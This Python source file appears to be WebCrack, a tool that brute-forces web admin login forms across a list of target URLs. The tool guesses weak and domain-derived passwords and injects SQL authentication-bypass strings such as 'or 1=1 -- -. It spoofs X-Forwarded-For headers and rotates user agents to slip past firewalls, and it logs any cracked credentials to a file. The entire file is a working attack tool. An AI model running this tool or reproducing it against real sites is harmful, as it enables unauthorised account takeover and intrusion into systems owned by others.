'''
type: python3
author: yzddmr6
github: https://github.com/yzddmr6/WebCrack
link: https://yzddmr6.tk/posts/webcrack-release/
'''

import time, requests, os, sys, re
import random, urllib
import datetime
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from bs4 import BeautifulSoup as BS
from urllib.parse import urlparse
import json

author_info = '''
*****************************************************
*                                                   *
****************    Code By yzddMr6   ***************
*                                                   *
*****************************************************
'''

log_file = 'web_crack_log.txt'
oklog_file = 'web_crack_ok.txt'

exp_user_dic = ["admin' or 'a'='a", "'or'='or'", "admin' or '1'='1' or 1=1", "')or('a'='a", "'or 1=1 -- -"]
exp_pass_dic = exp_user_dic

with open('cms.json','r',encoding="utf-8") as config:
    data=config.read()
    cms=json.loads(data)
    kind_num=len(cms)

def gettime():
    return time.strftime('%Y-%m-%d %X', time.localtime(time.time()))
def mix_dic(url):
    mix_user_dic = ['admin']
    mix_pass_dic = []
    static_pass_dic = ['{user}', '123456', '{user}888', '12345678', '123123',  '88888888','888888','password','123456a',
                       '{user}123', '{user}123456', '{user}666','{user}2018', '123456789', '654321', '666666','66666666',
                       '1234567890', '8888888', '987654321','0123456789', '12345', '1234567','000000','111111','5201314','123123']
    mix_pass_dic = gen_dynam_dic(url)
    static_pass_dic.extend(mix_pass_dic)
    return mix_user_dic, static_pass_dic

def gen_dynam_dic(url):
    dynam_pass_dic = []
    tmp_dic = []
    suffix_dic = ['', '123', '888', '666', '123456']
    list1 = url.split('/')
    host = list1[2].split(":")[0]
    compile_ip = re.compile('^(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)$')
    if compile_ip.match(host):
        check_ip = 1
    else:
        check_ip = 0
    if not check_ip:
        list2 = host.split(".")
        i = len(list2)
        for u in range(i):  # 生成url字典1
            list3 = list2[u:]
            part = '.'.join(list3)
            if (len(part) < 5):
                continue
            dynam_pass_dic.append(part)
        for u in range(i):  # 生成url字典2
            list3 = list2[u]
            if len(list3) < 5:
                continue
            tmp_dic.append(list3)
        for i in tmp_dic:
            for suffix in suffix_dic:
                u = i + suffix
                dynam_pass_dic.append(u)
        return dynam_pass_dic
    else:
        return ''


def requests_proxies():
    proxies = {
    #    'http':'127.0.0.1:8080',
    #    'https':'127.0.0.1:8080'
    }
    return proxies


def random_headers():#生成随机headers
    user_agent = ['Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre',
                  'Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60',
                  'Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14',
                  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5']
    UA = random.choice(user_agent)
    a = str(random.randint(1, 255))
    b = str(random.randint(1, 255))
    c = str(random.randint(1, 255))
    random_XFF = '127.' + a + '.' + b + '.' + c 
    random_CI= '127.' + c + '.' + a + '.' + b
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': UA,
        'X-Forwarded-For': random_XFF,
        'Client-IP':random_CI,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        "Referer": "http://www.baidu.com/",
        'Content-Type': 'application/x-www-form-urlencoded'}
    return headers


def recheck(path, data, user_name, pass_word):
    data1 = data
    conn = requests.session()
    pass_word = str(pass_word.replace('{user}', user_name))

    data_test = str(data1.replace('%7Buser_name%7D', 'admin'))
    data_test = str(data_test.replace('%7Bpass_word%7D', 'length_test'))

    data2 = str(data1.replace('%7Buser_name%7D', user_name))
    data2 = str(data2.replace('%7Bpass_word%7D', pass_word))
    res_test = conn.post(url=path, data=data_test, headers=random_headers(), timeout=20, verify=False,
                       allow_redirects=True, proxies=requests_proxies())#预请求
    res_01 = conn.post(url=path, data=data_test, headers=random_headers(), timeout=20, verify=False,
                       allow_redirects=True, proxies=requests_proxies())
    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                       allow_redirects=True, proxies=requests_proxies())
    res_01.encoding = res_01.apparent_encoding
    res_02.encoding = res_02.apparent_encoding
    error_length_01 = len(res_01.text+str(res_01.headers))
    error_length_02 = len(res_02.text+str(res_02.headers))

    if error_length_01 == error_length_02  or res_02.status_code == 403:
        return 0
    else:
        return 1


def get_post_path(content, url):
    form_action = str(content).split('\n')[0]
    soup = BS(form_action, "lxml")
    res=urlparse(url)
    path=''
    action_path=soup.form['action']

    if action_path.startswith('http'):
        path=action_path
    elif action_path.startswith('/'):
        root_path=res.scheme+'://'+res.netloc
        path=root_path+action_path
    else:
        relative_path=url.rstrip(url.split('/')[-1])
        path=relative_path+action_path
    return path


def get_form(url):
    url1 = url.strip()
    header = random_headers()
    res = requests.get(url1, timeout=20, verify=False, headers=header)
    res.encoding = res.apparent_encoding
    html = res.text
    cms_id =get_cms_kind(html)
    all_soup = BS(html, "lxml")
    captchas = ['验证码', '验 证 码','点击更换', '点击刷新','看不清','认证码','安全问题']
    if cms_id  and  cms[cms_id]['captcha'] == 1:
        print("[-] captcha in login page: " + url + '\n',gettime())
        with open(log_file, 'a+') as log:
            log.write("[-] captcha in login page: "  + url + '\n')
        return '','',''
    else:
        if not cms_id :
            for captcha in captchas:
                if captcha in html:
                    print("[-]" + captcha + " in login page: " + url + '\n',gettime())
                    with open(log_file, 'a+') as log:
                        log.write("[-]" + captcha + " in login page: " + url + '\n')
                    return '','',''
    try:
        title = all_soup.title.text
    except:
        title = ''
    result = re.findall(".*<form (.*)</form>.*", html, re.S)
    form_data = ''
    form_content = ''
    if result:
        form_data = '<form ' + result[0] + ' </form>'

        form_soup = BS(form_data, "lxml")

        form_content = form_soup.form

    return form_content, title,cms_id


def get_data(url, content):
    data = {}
    captcha = 0
    user_key = ''
    pass_key = ''
    for x in content.find_all('input'):
        ok_flag = 0
        if x.has_attr('name'):
            parameter = x['name']
        elif x.has_attr('id'):
            parameter = x['id']
        else:
            parameter = ''
        if x.has_attr('value'):
            value = x['value']
        else:
            value = '0000'
        if parameter:
            if not user_key:
                for z in [ 'user', 'name','zhanghao', 'yonghu', 'email', 'account']:
                    if z in parameter.lower():
                        value = '{user_name}'
                        user_key = parameter
                        ok_flag = 1
                        break
            if not ok_flag:
                for y in ['pass', 'pw', 'mima']:
                    if y in parameter.lower():
                        value = '{pass_word}'
                        pass_key = parameter
                        ok_flag = 1
                        break
            data[parameter] = str(value)

    for i in ['reset']:
        for r in list(data.keys()):
            if i in r.lower():
                data.pop(r)
    if user_key and  pass_key :
        return user_key, pass_key, str(urllib.parse.urlencode(data))
    else:
        return False, False, False

def get_error_length(conn, path, data):
    data1 = data
    dynamic_req_len = 0
    data2 = str(data1.replace('%7Buser_name%7D', 'admin'))
    data2 = str(data2.replace('%7Bpass_word%7D', 'length_test'))
    res_test = conn.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                       allow_redirects=True, proxies=requests_proxies())#先请求一次
    res_02 = conn.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                       allow_redirects=True, proxies=requests_proxies())
    res_02.encoding = res_02.apparent_encoding
    res = conn.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False, allow_redirects=True,
                    proxies=requests_proxies())
    res.encoding = res.apparent_encoding
    error_length_02 = len(res_02.text+str(res_02.headers))
    error_length = len(res.text+str(res.headers))
    if error_length_02 != error_length:
        dynamic_req_len = 1
    return error_length, dynamic_req_len

def confirm_login_page(url):
    form_content, title,cms_id = get_form(url)
    search_flag = ['检索', '搜', 'search', '查找', 'keyword', '关键字']
    for i in search_flag:
        if i in form_content:
            print("[-] Maybe search pages:", url)
            with open(log_file, 'a+') as log:
                log.write("[-] Maybe search pages:" +url+ '\n')
            form_content = ''

    logins = ['用户名', '密码', 'login', 'denglu', '登录', 'user', 'pass', 'yonghu', 'mima']
    login_flag = 0
    if form_content:
        for login in logins:
            if login in str(form_content):
                login_flag = 1
                break
        if login_flag == 0:
            print("[-] Maybe not login pages:", url)
            with open(log_file, 'a+') as log:
                log.write("[-] Maybe not login pages:"+url+ '\n')
            form_content = ''
    return form_content,cms_id

def get_cms_kind(html):

    for cms_id in range(kind_num):
        keyword = cms[cms_id]['keywords']
        if keyword and keyword in html:
            print("识别到cms:",cms[cms_id]['name'])
            if cms[cms_id]['alert']:
                print(cms[cms_id]['note'])
            return cms_id
    #print("未识别出当前所使用cms")
    return 0

def web_crack_task(url):
    try:
        form_content,cms_id = confirm_login_page(url)
        if cms_id :
            exp_able=cms[cms_id]['exp_able']
        else:
            exp_able=1
        if form_content:
            user_key,pass_key,data = get_data(url, form_content)
            if data:
                print("Checking :", url,gettime())
                path= get_post_path(form_content, url)
                user_dic, pass_dic = mix_dic(url)
                user_name, pass_word = crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id)
                recheck_flag = 1
                if user_name:
                    print("Rechecking...", url,user_name, pass_word)
                    recheck_flag = recheck( path, data, user_name, pass_word)
                else:
                    if exp_able:
                        user_dic=exp_user_dic
                        pass_dic=exp_pass_dic
                        print('启动万能密码爆破模块')
                        user_name, pass_word = crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id)
                        if user_name:
                            print("Rechecking......",url, user_name, pass_word)
                            recheck_flag = recheck(path, data, user_name, pass_word)
                        else:
                            recheck_flag = 0
                    else:
                            recheck_flag = 0
                    
                if recheck_flag:
                    with open(log_file, 'a+') as log:
                        log.write("[+] Success :" + url + '          ' + user_name + '/' + pass_word + '\n')
                    with open(oklog_file, 'a+') as oklog:
                        oklog.write(url + '          ' + user_name + '/' + pass_word + '\n')
                    print("[+] Success :", url, " user/pass", user_name+ '/' + pass_word)
                else:
                    print("[-] Faild :", url,gettime())
                    with open(log_file, 'a+') as log:
                        log.write("[-] Faild :"+url+ '\n')
    except Exception as e:
        start = datetime.datetime.now()
        with open('web_crack_error.txt', 'a+') as error_log:
            error_log.write(str(start) + str(e) + '\n')
        print(start, e)


def crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id):
    try:
        conn = requests.session()
        error_length, dynamic_req_len = get_error_length(conn, path, data)
        if dynamic_req_len:
            return False, False
        num = 0
        success_flag = 0
        dic_all = len(user_dic) * len(pass_dic)
        if not dic_all:
            return False, False
        fail_words = ['密码错误', '重试', '不正确', '密码有误','不成功', '重新输入', '不存在', '登录失败', '登陆失败','密码或安全问题错误','history.go','history.back',
                        '已被锁定','安全拦截','还可以尝试','无效','攻击行为','创宇盾','http://zhuji.360.cn/guard/firewall/stopattack.html','D盾_拦截提示','用户不存在',
                        '非法','百度云加速','安全威胁','防火墙','黑客', '不合法','Denied','尝试次数','http://safe.webscan.360.cn/stopattack.html']            
        for user_name in user_dic:
            for pass_word in pass_dic:
                right_pass = 1
                data1 = data
                pass_word = pass_word.replace('{user}', user_name)
                data2 = data1.replace('%7Buser_name%7D', urllib.parse.quote(user_name))
                data2 = data2.replace('%7Bpass_word%7D', urllib.parse.quote(pass_word))
                num = num + 1
                #print('URL: ',path,"字典总数：", dic_all, " 当前尝试：", num, " checking:", user_name, pass_word)
                print("字典总数：", dic_all, " 当前尝试：", num, " checking:", user_name, pass_word)
                res = conn.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                                allow_redirects=True, proxies=requests_proxies())
                #time.sleep(0.5)
                res.encoding = res.apparent_encoding
                html=res.text+str(res.headers)
                if cms_id and cms[cms_id]['success_flag']:
                    if  cms[cms_id]['success_flag'] in html:
                        success_flag = 1
                        return user_name, pass_word
                elif cms_id and cms[cms_id]['fail_flag'] :
                    if cms[cms_id]['fail_flag'] in html:
                        return False, False
                    else:
                        continue
                else:
                    for i in fail_words:
                        if i in html:
                            right_pass = 0
                            break
                    if right_pass:
                        cur_length = len(res.text + str(res.headers))
                        if user_key:
                            if user_key in res.text:
                                continue
                            elif pass_key:
                                if pass_key in res.text:
                                    continue
                        if cur_length != error_length:
                            success_flag = 1
                            return user_name, pass_word
                    else:
                        continue
        if success_flag == 0:
            return False, False
    except Exception as e:
        start = datetime.datetime.now()
        with open('web_crack_error.txt', 'a+') as error_log:
            error_log.write(str(start) + str(e) + '\n')
        print(start, e)

if __name__ == "__main__":
    print(author_info)
    url_file_name = input('File or Url:\n')
    now = gettime()
    try:
        if '://' in url_file_name:
            web_crack_task(url_file_name)
        else:
            url_list = []
            if os.path.exists(url_file_name):
                print(url_file_name,"exists!\n")
                with open(url_file_name,'r') as url_file:
                    for url in url_file.readlines():
                        url = url.strip()
                        if url.startswith('#') or  url=='' or ('.edu.cn' in url) or ('.gov.cn' in url) :
                            continue
                        url_list.append(url)
                url_all = len(url_list)
                cur_num = 0
                print("总任务数:", url_all)
                for url in url_list:
                    print("\n" + "["+ str(cur_num + 1)+"/"+str(url_all)+"]", " url:", url_list[cur_num])
                    web_crack_task(url)
                    cur_num += 1
            else:
                print(url_file_name + " not exist!")
                exit(0)
    except Exception as e:
        start = datetime.datetime.now()
        with open('web_crack_error.txt', 'a+') as error_log:
            error_log.write(str(start) + str(e) + '\n')
        print(start, e)